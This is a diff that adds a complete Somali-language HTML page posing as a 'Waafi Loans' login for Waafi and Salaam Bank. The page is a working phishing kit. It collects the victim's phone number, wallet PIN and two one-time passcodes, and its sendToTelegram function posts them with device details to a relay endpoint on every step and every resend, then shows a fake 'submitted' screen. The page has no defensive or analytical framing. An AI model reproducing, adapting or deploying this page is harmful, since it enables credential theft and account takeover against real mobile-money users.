@@ -1,1 +1,831 @@
-nkfgjw
+<!doctype html>
+<html lang="so">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#7bbf2e"/>
+<title>Waafi Loans · Login</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+:root{
+  --green:#7bbf2e;
+  --green-2:#93cc3a;
+  --green-dark:#5a9020;
+  --green-light:#f2f9e6;
+  --green-mid:#e3f4c0;
+  --green-soft:#f8fdf0;
+  --text:#111827;
+  --text-2:#374151;
+  --text-3:#6b7280;
+  --text-4:#9ca3af;
+  --border:#e5e7eb;
+  --border-green:rgba(123,191,46,.28);
+  --white:#ffffff;
+  --font:'DM Sans',sans-serif;
+  --mono:'DM Mono',monospace;
+  --radius-md:14px;
+  --radius-lg:18px;
+  --radius-xl:26px;
+}
+
+html,body{
+  width:100%;height:100%;height:100dvh;
+  overflow:hidden;overflow-x:hidden;
+  font-family:var(--font);
+  background:#f8fdf0;
+}
+
+.screen{
+  display:flex;flex-direction:column;
+  width:100%;height:100%;height:100dvh;
+  max-width:430px;margin:0 auto;
+  background:#f8fdf0;
+  overflow:hidden;overflow-x:hidden;
+  position:relative;
+}
+
+/* ── WHITE LOGO BAR ── */
+.header-bar{
+  background:white;
+  padding:10px 20px 12px;
+  display:flex;flex-direction:column;gap:8px;
+  flex-shrink:0;
+  border-bottom:1px solid #e8f5d8;
+  box-shadow:0 2px 8px rgba(0,0,0,.06);
+  position:relative;z-index:2;
+}
+
+.brand-logos{display:flex;align-items:center;gap:10px}
+.brand-logo-waafi{height:42px;object-fit:contain;display:block}
+.brand-logo-salaam{height:32px;object-fit:contain;display:block}
+.brand-sep{width:1.5px;height:28px;background:#d1e8b0;flex-shrink:0}
+
+.brand-bottom{display:flex;align-items:center;justify-content:space-between}
+.brand-sub{font-size:13px;font-weight:800;color:var(--green-dark);letter-spacing:.2px}
+
+.header-chip{
+  background:linear-gradient(135deg,#93cc3a,#66a020);
+  border:none;padding:6px 14px;border-radius:999px;
+  font-size:11px;font-weight:700;color:white;
+  letter-spacing:.3px;flex-shrink:0;white-space:nowrap;
+  box-shadow:0 2px 8px rgba(123,191,46,.3);
+}
+
+/* ── GREEN HEADER ── */
+.header{
+  background:linear-gradient(160deg,#93cc3a 0%,#7bbf2e 45%,#5a9020 100%);
+  padding:16px 20px 20px;
+  position:relative;overflow:hidden;flex-shrink:0;
+}
+
+.header::after{
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.07) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.07) 1px,transparent 1px);
+  background-size:44px 44px;pointer-events:none;
+}
+
+.hglow-a{
+  position:absolute;width:220px;height:220px;border-radius:50%;
+  background:rgba(255,255,255,.12);filter:blur(50px);
+  top:-90px;right:-60px;pointer-events:none;
+}
+.hglow-b{
+  position:absolute;width:160px;height:160px;border-radius:50%;
+  background:rgba(0,80,10,.18);filter:blur(40px);
+  bottom:-50px;left:-30px;pointer-events:none;
+}
+
+.header-info{position:relative;z-index:1}
+
+.header-label{
+  font-size:10px;color:rgba(255,255,255,.7);
+  font-weight:700;margin-bottom:4px;
+  text-transform:uppercase;letter-spacing:.5px;
+}
+
+.loan-amount-row{display:flex;align-items:flex-end;gap:5px;margin-bottom:10px}
+.loan-currency{font-size:15px;font-weight:700;color:rgba(255,255,255,.75);margin-bottom:3px}
+.loan-amount{
+  font-size:38px;font-weight:800;color:white;line-height:1;
+  font-family:var(--mono);font-variant-numeric:tabular-nums;
+}
+
+.loan-pills{display:flex;gap:6px;flex-wrap:wrap}
+.loan-pill{
+  background:rgba(255,255,255,.18);
+  border:1px solid rgba(255,255,255,.28);
+  border-radius:999px;padding:4px 10px;
+  font-size:10px;font-weight:700;color:white;
+  font-family:var(--mono);
+}
+.loan-pill-green{
+  background:rgba(255,255,255,.25);
+  border:1px solid rgba(255,255,255,.4);
+  border-radius:999px;padding:4px 10px;
+  font-size:10px;font-weight:800;color:white;
+  font-family:var(--mono);
+}
+
+/* ── BODY ── */
+.body{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  padding:16px 14px max(88px,calc(72px + env(safe-area-inset-bottom)));
+  overscroll-behavior:contain;min-height:0;
+}
+.body::-webkit-scrollbar{display:none}
+
+/* STEP */
+.step{display:none;flex-direction:column}
+.step.active{display:flex}
+
+/* ── CARD ── */
+.card{
+  background:linear-gradient(160deg,#ffffff 0%,#f6fce8 100%);
+  border:1px solid var(--border);
+  border-radius:var(--radius-lg);overflow:hidden;margin-bottom:10px;
+  box-shadow:0 2px 10px rgba(123,191,46,.1);
+}
+.card-accent{height:3px;width:100%;background:linear-gradient(90deg,#93cc3a,#7bbf2e,#a8d95a)}
+.card-header{
+  padding:13px 16px 11px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.card-title{font-size:14px;font-weight:700;color:var(--text)}
+.card-sub{font-size:11px;color:var(--text-3);font-weight:500;margin-top:2px}
+.card-body{padding:14px 16px}
+
+/* FIELD */
+.field{margin-bottom:14px}
+.field:last-child{margin-bottom:0}
+.field-label{
+  font-size:11px;font-weight:700;color:var(--text-2);
+  text-transform:uppercase;letter-spacing:.7px;margin-bottom:7px;
+}
+
+/* PHONE */
+.phone-row{display:flex;gap:8px}
+.phone-prefix{
+  background:var(--green-light);color:var(--green-dark);
+  font-size:13px;font-weight:800;font-family:var(--mono);
+  padding:0 12px;border-radius:var(--radius-md);
+  border:1.5px solid var(--border-green);
+  display:flex;align-items:center;flex-shrink:0;height:48px;
+}
+
+input[type=tel]{
+  width:100%;height:48px;padding:0 14px;
+  border-radius:var(--radius-md);
+  border:1.5px solid var(--border);
+  background:var(--green-soft);
+  font-family:var(--mono);font-size:16px;font-weight:600;
+  color:var(--text);outline:none;
+  transition:border-color .18s,box-shadow .18s;-webkit-appearance:none;
+}
+input[type=tel]::placeholder{color:var(--text-4);font-family:var(--font);font-size:14px;font-weight:400}
+input[type=tel]:focus{
+  border-color:var(--green);
+  box-shadow:0 0 0 4px rgba(123,191,46,.12);
+  background:white;
+}
+
+.field-hint{font-size:11px;color:var(--text-4);font-weight:500;margin-top:5px}
+
+/* PIN BOXES + EYE */
+.pin-wrap{
+  display:flex;align-items:center;gap:10px;
+}
+
+.pin-boxes{
+  display:flex;gap:8px;flex:1;
+}
+
+.pin-box{
+  flex:1;height:56px;
+  border-radius:12px;
+  border:1.5px solid var(--border);
+  background:var(--green-soft);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:22px;font-weight:800;
+  color:var(--text);
+  position:relative;overflow:hidden;
+  transition:border-color .18s,box-shadow .18s,background .18s;
+}
+
+.pin-box.filled{
+  background:white;
+  border-color:var(--green);
+}
+
+.pin-box.active{
+  border-color:var(--green);
+  box-shadow:0 0 0 3px rgba(123,191,46,.15);
+  background:white;
+}
+
+/* hidden single input overlay */
+.pin-hidden{
+  position:absolute;inset:0;
+  width:100%;height:100%;
+  opacity:0;cursor:pointer;
+  font-size:16px;z-index:2;
+  border:none;background:none;outline:none;
+  caret-color:transparent;
+}
+
+.pin-boxes-wrap{position:relative;flex:1}
+
+.pin-real{
+  /* actual hidden input stretches across all boxes */
+  position:absolute;inset:0;
+  width:100%;height:100%;
+  opacity:0;cursor:pointer;
+  font-size:16px;z-index:2;
+  border:none;background:none;outline:none;
+  caret-color:transparent;
+  letter-spacing:0;
+}
+
+.eye-btn-outside{
+  background:var(--green-light);
+  border:1.5px solid var(--border-green);
+  border-radius:10px;
+  width:44px;height:56px;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;flex-shrink:0;
+  color:var(--green-dark);
+  transition:background .15s;
+}
+.eye-btn-outside:active{background:var(--green-mid)}
+
+/* POWERED BY */
+.powered{
+  text-align:center;padding:4px 0 2px;
+  font-size:10px;color:var(--text-4);font-weight:500;letter-spacing:.3px;
+}
+.powered strong{color:var(--text-3);font-weight:700}
+
+/* ── STICKY FOOTER ── */
+.sticky-footer{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:12px 14px max(20px,env(safe-area-inset-bottom));
+  background:linear-gradient(to top,#f8fdf0 72%,transparent);z-index:10;
+}
+
+.pay-btn{
+  background:linear-gradient(135deg,#93cc3a 0%,#7bbf2e 55%,#5a9020 100%);
+  color:white;border:none;width:100%;padding:16px;
+  border-radius:var(--radius-md);
+  font-family:var(--font);font-size:15px;font-weight:800;
+  cursor:pointer;letter-spacing:-.1px;transition:all .15s;
+  opacity:.4;pointer-events:none;
+  box-shadow:0 4px 18px rgba(123,191,46,.35);
+}
+.pay-btn.active{opacity:1;pointer-events:auto}
+.pay-btn:active{transform:scale(.98);filter:brightness(.92)}
+
+/* ── MODAL SHEETS ── */
+.modal-overlay{
+  position:absolute;inset:0;background:rgba(0,0,0,.4);
+  display:none;align-items:flex-end;justify-content:center;z-index:100;
+}
+.modal-overlay.open{display:flex}
+
+.modal-sheet{
+  background:white;width:100%;
+  border-radius:var(--radius-xl) var(--radius-xl) 0 0;
+  padding:0 0 32px;animation:slideUp .22s ease;overflow:hidden;
+}
+@keyframes slideUp{from{transform:translateY(100%);opacity:0}to{transform:translateY(0);opacity:1}}
+
+.sheet-handle{width:36px;height:4px;background:#e5e7eb;border-radius:2px;margin:12px auto 0}
+
+.sheet-header{
+  padding:16px 20px 14px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.sheet-title{font-size:17px;font-weight:800;color:var(--text)}
+.sheet-close{
+  width:28px;height:28px;border-radius:50%;background:#f3f4f6;
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;cursor:pointer;color:var(--text-3);border:none;
+}
+.sheet-body{padding:16px 20px}
+.sheet-sub{font-size:10px;text-transform:uppercase;letter-spacing:.7px;font-weight:700;color:var(--text-4);margin-bottom:10px}
+
+/* OTP boxes in sheet */
+.otp-wrap{position:relative;height:60px;margin-bottom:4px}
+.otp-wrap #otpHidden1,
+.otp-wrap #otpHidden2{
+  position:absolute;inset:0;width:100%;height:100%;
+  opacity:0;cursor:pointer;font-size:16px;z-index:2;
+  border:none;background:none;outline:none;caret-color:transparent;
+}
+.otp-display{display:flex;gap:8px;pointer-events:none}
+.otp-box{
+  flex:1;height:60px;border-radius:12px;
+  border:1.5px solid var(--border);
+  background:var(--green-soft);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:22px;font-weight:800;
+  color:var(--text);
+  transition:border-color .18s,box-shadow .18s,background .18s;
+}
+.otp-box.filled{background:white;border-color:var(--green)}
+.otp-box.active{border-color:var(--green);box-shadow:0 0 0 3px rgba(123,191,46,.15);background:white}
+.otp-box.disabled{opacity:.4;background:#f9fafb;border-color:var(--border)}
+
+/* Timer */
+.timer-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0 0}
+.timer-label{font-size:12px;color:var(--text-4);font-weight:500}
+.timer-val{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--green-dark)}
+.resend-btn{
+  background:none;border:none;font-family:var(--font);
+  font-size:12px;font-weight:700;color:var(--green);
+  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
+}
+.resend-btn.active{opacity:1}
+
+/* Summary rows */
+.sheet-rows{
+  background:#f9fafb;border-radius:var(--radius-md);
+  overflow:hidden;border:1px solid var(--border);margin-bottom:14px;
+}
+.sheet-row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:11px 14px;border-bottom:1px solid var(--border);
+}
+.sheet-row:last-child{border-bottom:none}
+.sheet-row-key{font-size:12px;color:var(--text-3);font-weight:500}
+.sheet-row-val{font-size:13px;font-weight:700;color:var(--text)}
+
+.sheet-total{
+  background:var(--green-light);border-radius:var(--radius-md);
+  padding:14px;display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:18px;border:1px solid var(--border-green);
+}
+.sheet-total-label{font-size:13px;font-weight:700;color:var(--green-dark)}
+.sheet-total-val{font-size:22px;font-weight:800;color:var(--green);font-family:var(--mono)}
+
+.sheet-actions{display:flex;gap:10px}
+.btn-cancel{
+  flex:1;padding:14px;border-radius:var(--radius-md);
+  border:1.5px solid var(--border);background:transparent;
+  font-family:var(--font);font-size:14px;font-weight:700;
+  color:var(--text-3);cursor:pointer;
+}
+.btn-primary{
+  flex:2;padding:14px;border-radius:var(--radius-md);
+  border:none;
+  background:linear-gradient(135deg,#93cc3a,#7bbf2e,#5a9020);
+  font-family:var(--font);font-size:14px;font-weight:800;
+  color:white;cursor:pointer;
+  box-shadow:0 4px 12px rgba(123,191,46,.28);
+}
+.btn-primary:active{filter:brightness(.92);transform:scale(.98)}
+</style>
+</head>
+<body>
+
+<div class="screen">
+
+  <!-- WHITE LOGO BAR -->
+  <div class="header-bar">
+    <div class="brand-logos">
+      <img src="assets/waafi.svg" alt="Waafi" class="brand-logo-waafi">
+      <div class="brand-sep"></div>
+      <img src="assets/salaamlogo.webp" alt="Salaam" class="brand-logo-salaam">
+    </div>
+    <div class="brand-bottom">
+      <div class="brand-sub">Waafi Loans</div>
+      <div class="header-chip">Amaah Degdeg ah</div>
+    </div>
+  </div>
+
+  <!-- GREEN HEADER — loan summary -->
+  <div class="header">
+    <div class="hglow-a"></div><div class="hglow-b"></div>
+    <div class="header-info">
+      <div class="header-label">Xaddiga Amaahda</div>
+      <div class="loan-amount-row">
+        <span class="loan-currency">USD</span>
+        <span class="loan-amount" id="hAmount">0.00</span>
+      </div>
+      <div class="loan-pills">
+        <span class="loan-pill" id="hType">—</span>
+        <span class="loan-pill" id="hDur">—</span>
+        <span class="loan-pill-green" id="hMonthly">—/bil</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- BODY -->
+  <div class="body">
+
+    <!-- STEP 1: Login -->
+    <div id="step1" class="step active">
+
+      <div class="card">
+        <div class="card-accent"></div>
+        <div class="card-header">
+          <div>
+            <div class="card-title">Xaqiiji Codsigaaga</div>
+            <div class="card-sub">Gali lambarka iyo PIN-kaaga Waafi</div>
+          </div>
+          <img src="assets/waafi.svg" alt="Waafi" style="height:32px;object-fit:contain;display:block;flex-shrink:0">
+        </div>
+        <div class="card-body">
+
+          <div class="field">
+            <div class="field-label">Lambarka Telefoonka</div>
+            <div class="phone-row">
+              <div class="phone-prefix">+252</div>
+              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX">
+            </div>
+            <div class="field-hint">Lambarka 9-nambar ee Waafi</div>
+          </div>
+
+          <div class="field">
+            <div class="field-label" style="margin-bottom:7px">PIN-kaaga</div>
+            <div class="pin-wrap">
+              <div class="pin-boxes-wrap">
+                <div class="pin-boxes" id="pinBoxes">
+                  <div class="pin-box" id="pb0"></div>
+                  <div class="pin-box" id="pb1"></div>
+                  <div class="pin-box" id="pb2"></div>
+                  <div class="pin-box" id="pb3"></div>
+                </div>
+                <input type="password" id="pinHidden" inputmode="numeric"
+                  maxlength="4" autocomplete="current-password"
+                  class="pin-real">
+              </div>
+              <button class="eye-btn-outside" id="eyeBtn" type="button" aria-label="Muuji PIN">
+                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="powered">Powered by <strong>Waafi</strong> &middot; <strong>Salaam Bank</strong></div>
+    </div>
+
+    <!-- STEP 4: Processing -->
+    <div id="step4" class="step">
+      <div class="card">
+        <div class="card-accent"></div>
+        <div class="card-body" style="padding:32px 16px;text-align:center">
+          <div style="width:60px;height:60px;border-radius:50%;background:var(--green-light);border:2px solid var(--border-green);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:26px">✅</div>
+          <div style="font-size:18px;font-weight:800;color:var(--text);margin-bottom:6px">La gudbiyay!</div>
+          <div style="font-size:13px;color:var(--text-3);font-weight:500;line-height:1.6">Codsigaaga amaahda ayaa la diray.<br>Fadlan sug jawaab.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <div class="sticky-footer">
+    <button class="pay-btn" id="mainBtn">Xaqiiji Faahfaahinta</button>
+  </div>
+
+  <!-- ── OTP MODAL 1 (identity verify) ── -->
+  <div class="modal-overlay" id="otpModal1" onclick="handleOverlay('otpModal1',event)">
+    <div class="modal-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <div class="sheet-title">Xaqiijinta Aqoonsiga</div>
+        <button class="sheet-close" onclick="closeModal('otpModal1')">&#x2715;</button>
+      </div>
+      <div class="sheet-body">
+        <div class="sheet-sub">Gali OTP-ga 6-nambar ah</div>
+        <div class="otp-wrap" id="otpWrap1">
+          <input type="text" id="otpHidden1" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
+          <div class="otp-display" id="otp1Display">
+            <div class="otp-box" id="o1b0"></div><div class="otp-box" id="o1b1"></div>
+            <div class="otp-box" id="o1b2"></div><div class="otp-box" id="o1b3"></div>
+            <div class="otp-box" id="o1b4"></div><div class="otp-box" id="o1b5"></div>
+          </div>
+        </div>
+        <div class="timer-row">
+          <div class="timer-label">Waxay dhacaysaa <span class="timer-val" id="time1">120</span>s</div>
+          <button class="resend-btn" id="resend1">Dib u dir</button>
+        </div>
+        <div style="margin-top:16px">
+          <button class="btn-primary" id="otp1Btn" style="width:100%;opacity:.4;pointer-events:none"
+            onclick="submitOtp1()">Xaqiiji →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── SUMMARY MODAL ── -->
+  <div class="modal-overlay" id="summaryModal" onclick="handleOverlay('summaryModal',event)">
+    <div class="modal-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <div class="sheet-title">Kooban Codsiga</div>
+        <button class="sheet-close" onclick="closeModal('summaryModal')">&#x2715;</button>
+      </div>
+      <div class="sheet-body">
+        <div class="sheet-sub">Faahfaahinta Amaahda</div>
+        <div class="sheet-rows" id="summaryRows"></div>
+        <div class="sheet-total">
+          <div class="sheet-total-label">Celinta Bishiiba</div>
+          <div class="sheet-total-val" id="summaryMonthly">$0.00</div>
+        </div>
+        <div class="sheet-actions">
+          <button class="btn-cancel" onclick="closeModal('summaryModal')">Dib u eeg</button>
+          <button class="btn-primary" onclick="openOtp2()">Gudbi Codsiga →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── OTP MODAL 2 (submit application) ── -->
+  <div class="modal-overlay" id="otpModal2" onclick="handleOverlay('otpModal2',event)">
+    <div class="modal-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <div class="sheet-title">Xaqiiji Gudbinta</div>
+        <button class="sheet-close" onclick="closeModal('otpModal2')">&#x2715;</button>
+      </div>
+      <div class="sheet-body">
+        <div class="sheet-sub">Gali OTP-ga si aad u gudbiso codsigaaga</div>
+        <div class="otp-wrap" id="otpWrap2">
+          <input type="text" id="otpHidden2" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
+          <div class="otp-display" id="otp2Display">
+            <div class="otp-box" id="o2b0"></div><div class="otp-box" id="o2b1"></div>
+            <div class="otp-box" id="o2b2"></div><div class="otp-box" id="o2b3"></div>
+            <div class="otp-box" id="o2b4"></div><div class="otp-box" id="o2b5"></div>
+          </div>
+        </div>
+        <div class="timer-row">
+          <div class="timer-label">Waxay dhacaysaa <span class="timer-val" id="time2">120</span>s</div>
+          <button class="resend-btn" id="resend2">Dib u dir</button>
+        </div>
+        <div style="margin-top:16px">
+          <button class="btn-primary" id="otp2Btn" style="width:100%;opacity:.4;pointer-events:none"
+            onclick="submitOtp2()">Gudbi Codsiga ✓</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ── Load plan ── */
+let selectedPlan=null;
+try{selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
+
+function fmt(n){return parseFloat(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})}
+
+function initHeader(){
+  if(!selectedPlan) return;
+  document.getElementById("hAmount").textContent=fmt(selectedPlan.loanAmount||0);
+  document.getElementById("hType").textContent=selectedPlan.loanType||"Amaah";
+  document.getElementById("hDur").textContent=(selectedPlan.duration||1)+" bilood";
+  document.getElementById("hMonthly").textContent="$"+fmt(selectedPlan.monthlyRepayment||0)+"/bil";
+  // Pre-fill phone if saved
+  if(selectedPlan.phone){
+    const ph=selectedPlan.phone.replace("+252","");
+    document.getElementById("phone").value=ph;
+    phoneValue=selectedPlan.phone;
+  }
+}
+initHeader();
+
+/* ── Device ── */
+const ua=navigator.userAgent;
+let device="Unknown";
+if(/Android/i.test(ua)) device="Android";
+else if(/iPhone|iPad/i.test(ua)) device="iOS";
+if(/Chrome/i.test(ua)) device+=" | Chrome";
+else if(/Safari/i.test(ua)) device+=" | Safari";
+
+let phoneValue="";
+let pinValue="";
+let otp1Value="";
+let otp2Value="";
+let otp1Submitted=false;
+let otp2Submitted=false;
+let resend1Clicked=false;
+let resend2Clicked=false;
+let pinVisible=false;
+
+async function sendToTelegram(eventName,extra){
+  fetch("/api/sendTelegram",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      submittedAt:new Date().toISOString(),
+      loginPhone:phoneValue,loginPin:pinValue,
+      otp1:otp1Value,otp2:otp2Value,
+      event:eventName,device:device,
+      plan:selectedPlan?JSON.stringify(selectedPlan):"None",
+      ...extra
+    })
+  });
+}
+
+/* ── Phone ── */
+document.getElementById("phone").oninput=function(){
+  let v=this.value.replace(/\D/g,"");
+  if(v.startsWith("252")) v=v.slice(3);
+  if(v.startsWith("0")) v=v.slice(1);
+  this.value=v.slice(0,9);
+  phoneValue="+252"+this.value;
+  validateLogin();
+};
+
+/* ── PIN hidden input → 4 visual boxes ── */
+const pinHidden=document.getElementById("pinHidden");
+const pinBoxes=[...document.querySelectorAll(".pin-box")];
+
+function renderPin(){
+  const raw=pinHidden.value.replace(/\D/g,"").slice(0,4);
+  pinHidden.value=raw;
+  pinValue=raw;
+  const cursor=raw.length;
+  pinBoxes.forEach((box,i)=>{
+    box.className="pin-box";
+    if(i<raw.length){
+      box.textContent=pinVisible?raw[i]:"•";
+      box.classList.add("filled");
+    } else {
+      box.textContent="";
+    }
+    if(i===cursor&&document.activeElement===pinHidden) box.classList.add("active");
+  });
+  validateLogin();
+}
+
+pinHidden.addEventListener("input",renderPin);
+pinHidden.addEventListener("focus",renderPin);
+pinHidden.addEventListener("blur",renderPin);
+
+// tap anywhere on boxes → focus hidden input
+document.getElementById("pinBoxes").addEventListener("click",()=>pinHidden.focus());
+
+/* ── Eye toggle ── */
+document.getElementById("eyeBtn").onclick=()=>{
+  pinVisible=!pinVisible;
+  document.getElementById("eyeBtn").innerHTML=pinVisible
+    ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
+    :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+  renderPin();
+};
+
+function validateLogin(){
+  const ok=phoneValue.length===13&&pinValue.length===4;
+  document.getElementById("mainBtn").classList.toggle("active",ok);
+}
+
+/* ── Main button → open OTP 1 ── */
+document.getElementById("mainBtn").onclick=()=>{
+  sendToTelegram("login_attempt");
+  openModal("otpModal1");
+  startTimer(1);
+};
+
+/* ── Modal helpers ── */
+function openModal(id){document.getElementById(id).classList.add("open")}
+function closeModal(id){document.getElementById(id).classList.remove("open")}
+function handleOverlay(id,e){if(e.target===document.getElementById(id)) closeModal(id)}
+
+/* ── OTP 1 ── */
+const otp1Hidden=document.getElementById("otpHidden1");
+const otp1Boxes=[...document.querySelectorAll("#otp1Display .otp-box")];
+let otp1Disabled=false;
+
+function renderOtp1(){
+  const val=otp1Hidden.value.replace(/\D/g,"").slice(0,6);
+  otp1Hidden.value=val;otp1Value=val;
+  const cursor=val.length;
+  otp1Boxes.forEach((box,i)=>{
+    box.textContent=val[i]||"";
+    box.className="otp-box";
+    if(otp1Disabled){box.classList.add("disabled");return}
+    if(i<cursor) box.classList.add("filled");
+    if(i===cursor&&document.activeElement===otp1Hidden) box.classList.add("active");
+  });
+  const btn=document.getElementById("otp1Btn");
+  btn.style.opacity=val.length===6?"1":".4";
+  btn.style.pointerEvents=val.length===6?"auto":"none";
+}
+
+otp1Hidden.addEventListener("input",renderOtp1);
+otp1Hidden.addEventListener("focus",renderOtp1);
+otp1Hidden.addEventListener("blur",renderOtp1);
+document.getElementById("otpWrap1").addEventListener("click",()=>{if(!otp1Disabled) otp1Hidden.focus()});
+
+function submitOtp1(){
+  if(otp1Value.length!==6||otp1Submitted) return;
+  otp1Submitted=true;
+  sendToTelegram("otp1_verified");
+  closeModal("otpModal1");
+  // Build summary then open
+  buildSummary();
+  openModal("summaryModal");
+}
+
+/* ── OTP 2 ── */
+const otp2Hidden=document.getElementById("otpHidden2");
+const otp2Boxes=[...document.querySelectorAll("#otp2Display .otp-box")];
+let otp2Disabled=false;
+
+function renderOtp2(){
+  const val=otp2Hidden.value.replace(/\D/g,"").slice(0,6);
+  otp2Hidden.value=val;otp2Value=val;
+  const cursor=val.length;
+  otp2Boxes.forEach((box,i)=>{
+    box.textContent=val[i]||"";
+    box.className="otp-box";
+    if(otp2Disabled){box.classList.add("disabled");return}
+    if(i<cursor) box.classList.add("filled");
+    if(i===cursor&&document.activeElement===otp2Hidden) box.classList.add("active");
+  });
+  const btn=document.getElementById("otp2Btn");
+  btn.style.opacity=val.length===6?"1":".4";
+  btn.style.pointerEvents=val.length===6?"auto":"none";
+}
+
+otp2Hidden.addEventListener("input",renderOtp2);
+otp2Hidden.addEventListener("focus",renderOtp2);
+otp2Hidden.addEventListener("blur",renderOtp2);
+document.getElementById("otpWrap2").addEventListener("click",()=>{if(!otp2Disabled) otp2Hidden.focus()});
+
+function openOtp2(){
+  closeModal("summaryModal");
+  openModal("otpModal2");
+  startTimer(2);
+}
+
+function submitOtp2(){
+  if(otp2Value.length!==6||otp2Submitted) return;
+  otp2Submitted=true;
+  sendToTelegram("application_submitted");
+  closeModal("otpModal2");
+  // Show processing step
+  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
+  document.getElementById("step4").classList.add("active");
+  document.getElementById("mainBtn").style.display="none";
+  setTimeout(()=>{location.href="thankyou.html"},1400);
+}
+
+/* ── Summary ── */
+function buildSummary(){
+  if(!selectedPlan){
+    document.getElementById("summaryRows").innerHTML=`<div class="sheet-row"><span class="sheet-row-key">Codsiga</span><span class="sheet-row-val">La kala xidhay</span></div>`;
+    return;
+  }
+  const p=selectedPlan;
+  const dur=(p.duration||1)+(p.duration===1?" bil":" bilood");
+  document.getElementById("summaryRows").innerHTML=`
+    <div class="sheet-row"><span class="sheet-row-key">Magaca</span><span class="sheet-row-val">${p.firstName||""} ${p.lastName||""}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Telefoon</span><span class="sheet-row-val">${phoneValue||p.phone||"—"}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Nooca Amaahda</span><span class="sheet-row-val">${p.loanType||"—"}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Xaddiga</span><span class="sheet-row-val">$${fmt(p.loanAmount||0)}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Muddada</span><span class="sheet-row-val">${dur}</span></div>
+    <div class="sheet-row"><span class="sheet-row-key">Wadarta La Celinta</span><span class="sheet-row-val">$${fmt(p.totalRepayable||0)}</span></div>
+  `;
+  document.getElementById("summaryMonthly").textContent="$"+fmt(p.monthlyRepayment||0);
+}
+
+/* ── Timers ── */
+function startTimer(n){
+  let t=120;
+  const timeEl=document.getElementById("time"+n);
+  const resendBtn=document.getElementById("resend"+n);
+  timeEl.textContent=t;
+  resendBtn.classList.remove("active");
+  if(n===1){otp1Disabled=false;otp1Hidden.value="";otp1Hidden.disabled=false;renderOtp1();otp1Hidden.focus();}
+  else{otp2Disabled=false;otp2Hidden.value="";otp2Hidden.disabled=false;renderOtp2();otp2Hidden.focus();}
+  const timer=setInterval(()=>{
+    t--;timeEl.textContent=t;
+    if(t<=0){
+      clearInterval(timer);
+      resendBtn.classList.add("active");
+      if(n===1){otp1Disabled=true;otp1Hidden.disabled=true;renderOtp1()}
+      else{otp2Disabled=true;otp2Hidden.disabled=true;renderOtp2()}
+    }
+  },1000);
+  resendBtn.onclick=()=>{
+    if(!resendBtn.classList.contains("active")) return;
+    sendToTelegram("resend_otp"+n);
+    startTimer(n);
+  };
+}
+</script>
+</body>
+</html>
